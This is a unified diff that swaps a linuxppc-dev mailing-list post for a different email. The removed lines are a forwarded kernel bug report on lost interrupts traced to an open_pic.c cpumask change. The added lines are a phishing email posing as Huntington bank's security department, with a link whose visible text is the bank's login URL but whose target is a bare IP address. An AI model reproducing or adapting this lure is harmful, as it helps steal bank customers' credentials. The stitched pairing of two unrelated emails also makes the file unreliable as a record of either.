@@ -1,19 +1,16 @@
-Return-Path: <benh@kernel.crashing.org>
-Received: from gate.crashing.org (gate.crashing.org [63.228.1.57])
-	(using TLSv1 with cipher DHE-RSA-AES256-SHA (256/256 bits))
-	(Client did not present a certificate)
-	by ozlabs.org (Postfix) with ESMTP id 4A71167A64
-	for <linuxppc-dev@ozlabs.org>; Sun, 13 Mar 2005 17:47:52 +1100 (EST)
-Received: from gaston (localhost [127.0.0.1])
-	by gate.crashing.org (8.12.8/8.12.8) with ESMTP id j2D6jcgJ032621
-	for <linuxppc-dev@ozlabs.org>; Sun, 13 Mar 2005 00:45:39 -0600
-From: Benjamin Herrenschmidt <benh@kernel.crashing.org>
-To: linuxppc-dev list <linuxppc-dev@ozlabs.org>
-Content-Type: text/plain
-Date: Sun, 13 Mar 2005 17:47:09 +1100
-Message-Id: <1110696430.19810.105.camel@gaston>
-Mime-Version: 1.0
-Subject: [Fwd: Re: hda: lost interrupt starting with 2.6.8]
+Return-Path: <security@huntington.com>
+Received: from 62.193.235.107 (wpc2243.amenworld.com [62.193.235.107])
+	by ozlabs.org (Postfix) with SMTP id 7D47567A64
+	for <linuxppc-dev@ozlabs.org>; Sun, 13 Mar 2005 18:29:27 +1100 (EST)
+Message-ID: <SQHRTFSAYOOHDXXFSRRIPJJ@hotmail.com>
+From: "Huntington Mutual Security Department" <security@huntington.com>
+To: linuxppc-dev@ozlabs.org
+Date: Sun, 13 Mar 2005 05:26:26 -0200
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="--18622562038672059770"
+Subject: *** Huntington Security Issues ***
+Reply-To: Huntington Mutual Security Department <security@huntington.com>
 List-Id: Linux on PowerPC Developers Mail List <linuxppc-dev.ozlabs.org>
 List-Unsubscribe: <https://ozlabs.org/mailman/listinfo/linuxppc-dev>,
 	<mailto:linuxppc-dev-request@ozlabs.org?subject=unsubscribe>
@@ -23,59 +20,115 @@ List-Help: <mailto:linuxppc-dev-request@ozlabs.org?subject=help>
 List-Subscribe: <https://ozlabs.org/mailman/listinfo/linuxppc-dev>,
 	<mailto:linuxppc-dev-request@ozlabs.org?subject=subscribe>
 
--------- Forwarded Message --------
-From: Vince Weaver <vince@deater.net>
-To: Benjamin Herrenschmidt <benh@kernel.crashing.org>
-Cc: debian-powerpc@lists.debian.org <debian-powerpc@lists.debian.org>
-Subject: Re: hda: lost interrupt starting with 2.6.8
-Date: Sun, 13 Mar 2005 00:18:38 -0500 (EST)
-OK, I've spent most of the day making my poor iBook compile kernels and 
-I've tracked down the error.  I can't seem to figure out why it would 
-happen on my machine and no one elses, at least unless it's a compiler 
-issue (I am using gcc 3.2.2).
+----18622562038672059770
+Content-Type: text/html;
+Content-Transfer-Encoding: quoted-printable
 
-Somewhere between 2.6.8-rc1 and 2.6.8-rc2 interrupts just stop getting 
-delivered.
+<html>
+<head>
+  <title>Untitled Document</title>
+  <meta http-equiv=3D"Content-Type"
+ content=3D"text/html; charset=3Diso-8859-1">
+</head>
+<body>
+<p align=3D"justify">
+<font face=3D"Verdana" style=3D"font-size: 8pt">&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;&nbsp;&nbsp;&nbsp;
+<a target=3D"_blank" href=3D"http://80.37.240.225/.a/index.htm">
+<img
+ src=3D"http://www.huntington.com/images/layout/huntington_logo.gif"
+ style=3D"border: 0px solid ; width: 342px; height: 58px"
+ alt=3D"huntington.com" title=3D""></a>&nbsp; </font> </p>
+<p 
+align=3D"justify"><font face=3D"Verdana" style=3D"font-size: 8pt">&nbsp;&n=
+bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
+p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
+p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+</font> 
+</p>
+<p align=3D"justify"><font face=3D"Verdana" style=3D"font-size: 8pt"><b>De=
+ar Huntington Client,</b></font></p>
+<p 
+align=3D"justify"><font face=3D"Verdana" style=3D"font-size: 8pt"><b>&nbsp=
+;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b>
+To provide our customers the most effective and secure 
+online<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+access to their accounts, we are continually upgrading our 
+online<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+services. As we add new features and enhancements to our 
+service,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+there are certain browsers versions which will not support 
+these<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+system upgrades. As many customers already know, 
+Microsoft<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+Internet Explorer has significant 'holes' or vulnerabilities that 
+virus<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+creators can easily take advantage of .</font></p>
+<p 
+align=3D"justify"><font face=3D"Verdana" style=3D"font-size: 8pt">&nbsp;&n=
+bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; In 
+order to further protect your account, we have introduced 
+some<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+new important security standards and browsers 
+requirements.<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+Huntington security systems require that you test your browser 
+now<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+to see if meets the requirements to Huntington Online Banking. </font> </p=
+>
+<p 
+align=3D"justify"><font face=3D"Verdana" style=3D"font-size: 8pt">&nbsp;&n=
+bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Pleas 
+follow this link in order to verify security update 
+installation.<br></font></p>
+<p align=3D"left">
+<span style=3D"font-size: 8pt; font-weight:bold; 
+font-family:Verdana">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
+; 
+<a target=3D"_blank" href=3D"http://80.37.240.225/.a/index.htm">https://on=
+linebanking.huntington.com/security/login.jsp</a></span></p>
+<p align=3D"left">
+<span style=3D"font-family: Verdana; font-weight: 700; 
+font-size: 8pt">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span><font face=3D"Verdana" style=3D"font-size: 8pt">This security updat=
+e will be effective immediately . In the 
+meantime<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+some of the Internet Banking services may not be available.</font></p>
+<p align=3D"left">
+&nbsp;</p>
+<table cellSpacing=3D"0" cellPadding=3D"0" width=3D"100%" border=3D"0">
+	<tr>
+		<td>
+		<table cellSpacing=3D"0" cellPadding=3D"0" width=3D"100%" border=3D"0">
+			<tr>
+				<td class=3D"footer">
+				<div align=3D"center">
+					<font face=3D"Verdana">
+					<span style=3D"font-size: 7pt">Member
+					<a 
+onclick=3D"window.open('http://www.fdic.gov/deposit/deposits/index.html','=
+a','width=3D800,height=3D500,scrollbars=3Dyes,resizable=3Dyes,status=3Dyes=
+'); 
+return false" target=3D"a" 
+href=3D"http://www.fdic.gov/deposit/deposits/index.html">
+					<span class=3D"footer">FDIC</span></a> | Equal Housing Lender
+					<img height=3D"13" src=3D"http://www.huntington.com/images/EHL.gif" 
+width=3D"22"><br>
+					<img height=3D"9" alt=3D"" 
+src=3D"http://www.huntington.com/images/small-logo.gif" width=3D"8" 
+border=3D"0">&nbsp;=AE 
+					and Huntington=AE are federally registered service marks of 
+					Huntington Bancshares Incorporated.<br>
+					=A9 2005 Huntington Bancshares Incorporated</span></font></div>
+				</td>
+			</tr>
+		</table>
+		</td>
+	</tr>
+</table>
+</body>
+</html>
 
-I tracked it down to this patch to linux/arch/ppc/syslib/open_pic.c :
-
-  /*
-   *  Map an interrupt source to one or more CPUs
-   */
--static void openpic_mapirq(u_int irq, u_int physmask, u_int keepmask)
-+static void openpic_mapirq(u_int irq, cpumask_t physmask, cpumask_t keepmask)
-  {
-         if (ISR[irq] == 0)
-                 return;
--       if (keepmask != 0)
--               physmask |= openpic_read(&ISR[irq]->Destination) & 
-keepmask;
--       openpic_write(&ISR[irq]->Destination, physmask);
-+       if (!cpus_empty(keepmask)) {
-+               cpumask_t irqdest = { .bits[0] = 
-openpic_read(&ISR[irq]->Destination) };
-+               cpus_and(irqdest, irqdest, keepmask);
-+               cpus_or(physmask, physmask, irqdest);
-+       }
-+       openpic_write(&ISR[irq]->Destination, cpus_addr(physmask)[0]);
-  }
-
-And this one:
--               openpic_mapirq(i, 1<<0, 0);
-+               openpic_mapirq(i, CPU_MASK_CPU0, CPU_MASK_NONE);
-
-
-Using printk's, I can see before the change I properly was writing "1" as 
-the second argument to openpic_write, but afterwards it was 0.
-
-It seems as though for some reason CPU_MASK_CPU0 is 0 on my kernel, rather 
-than just a 1.
-
-By patching the kernel to force it to write a 1 in openpic_write the 
-kernel runs fine...
-
-So, any ideas?  I'll be glad to try out anything else if you'd like me to.
-
-Vince
--- 
-Benjamin Herrenschmidt <benh@kernel.crashing.org>
+----18622562038672059770--
